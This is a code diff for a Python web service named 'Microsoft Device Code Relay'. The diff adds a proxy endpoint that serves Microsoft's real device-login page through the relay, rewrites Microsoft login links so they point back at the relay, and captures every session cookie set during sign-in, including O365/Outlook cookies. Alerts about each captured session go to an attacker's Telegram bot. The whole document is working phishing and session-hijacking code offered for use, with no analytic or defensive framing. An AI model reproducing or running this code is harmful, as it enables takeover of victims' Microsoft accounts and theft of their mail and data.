@@ -1,23 +1,28 @@
-from fastapi import FastAPI, HTTPException
+from fastapi import FastAPI, HTTPException, Request, Response
+from fastapi.middleware.cors import CORSMiddleware
 import httpx
 import asyncio
 import os
 import time
 import json
+import re
+from http.cookies import SimpleCookie
+from typing import Dict, Optional
 import redis.asyncio as aioredis
 
-app = FastAPI()
+app = FastAPI(title="Microsoft Device Code Relay")
 
 CLIENT_ID = os.getenv("MICROSOFT_CLIENT_ID")
 TENANT_ID = os.getenv("MICROSOFT_TENANT_ID", "common")
 RELAY_URL = os.getenv("RELAY_URL")
 SCOPES = os.getenv("SCOPES", "https://graph.microsoft.com/.default offline_access openid profile").split()
+ENABLE_PROXY = os.getenv("ENABLE_SESSION_PROXY", "true").lower() == "true"
 TELEGRAM_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
 TELEGRAM_CHAT = os.getenv("TELEGRAM_CHAT_ID")
 REDIS_URL = os.getenv("REDIS_URL")
 
 redis_client = None
-sessions = {}
+sessions: Dict[str, dict] = {}
 
 app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])
 
@@ -50,7 +55,7 @@ async def send_telegram(device_code, user_code, count):
     if not (TELEGRAM_TOKEN and TELEGRAM_CHAT):
         return
     try:
-        msg = f"New Session\nDevice: {device_code[:12]}...\nCode: {user_code}\nCookies: {count}"
+        msg = f"New Session\nDevice: {device_code[:12]}...\nCode: {user_code}\nCookies: {count} (O365/Outlook included)"
         async with httpx.AsyncClient() as c:
             await c.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", json={"chat_id": TELEGRAM_CHAT, "text": msg})
     except:
@@ -128,6 +133,58 @@ async def get_status(device_code: str):
 @app.get("/health")
 async def health():
     return {"status": "healthy", "client_id_set": bool(CLIENT_ID)}
+
+
+# PROXY - Opens the ORIGINAL Microsoft device auth page
+@app.api_route("/proxy/device-login/{device_code}", methods=["GET", "POST", "HEAD", "OPTIONS"])
+async def proxy(device_code: str, request: Request):
+    if not ENABLE_PROXY:
+        raise HTTPException(403, "Proxy disabled")
+
+    session = await get_session(device_code)
+    if not session or "user_code" not in session:
+        raise HTTPException(404, "Session expired or invalid")
+
+    cookie_jar = httpx.Cookies()
+    for n, c in session.get("cookies", {}).items():
+        cookie_jar.set(n, c.get("value", ""), domain=".microsoftonline.com")
+
+    # ORIGINAL Microsoft device login page
+    target_url = "https://microsoft.com/devicelogin"
+
+    async with httpx.AsyncClient(cookies=cookie_jar, follow_redirects=True, timeout=60) as c:
+        resp = await c.request(
+            method=request.method,
+            url=target_url,
+            params={"input": session["user_code"]},
+            headers={k: v for k, v in request.headers.items() if k.lower() not in ["host", "content-length", "cookie"]},
+            content=await request.body() if request.method != "GET" else None
+        )
+
+    # Capture all cookies from every redirect
+    captured = {}
+    for past in list(resp.history) + [resp]:
+        for h in past.headers.getlist("set-cookie"):
+            cookie = SimpleCookie()
+            cookie.load(h)
+            for m in cookie.values():
+                captured[m.key] = {"value": m.value, "domain": ".microsoftonline.com", "path": "/"}
+
+    if "cookies" not in session:
+        session["cookies"] = {}
+    session["cookies"].update(captured)
+    await save_session(device_code, session)
+
+    # Stream the original Microsoft page
+    content = resp.content
+    if "text/html" in resp.headers.get("content-type", ""):
+        html = resp.text
+        base = f"{request.url.scheme}://{request.url.netloc}/proxy/device-login/{device_code}"
+        html = re.sub(r'https?://(login\.microsoftonline\.com|account\.microsoft\.com|login\.live\.com|microsoft\.com)', base, html, flags=re.IGNORECASE)
+        content = html.encode()
+
+    headers = {k: v for k, v in resp.headers.items() if k.lower() not in ["transfer-encoding", "content-length", "connection", "set-cookie"]}
+    return Response(content=content, status_code=resp.status_code, headers=headers, media_type=resp.headers.get("content-type"))
 
 
 if __name__ == "__main__":
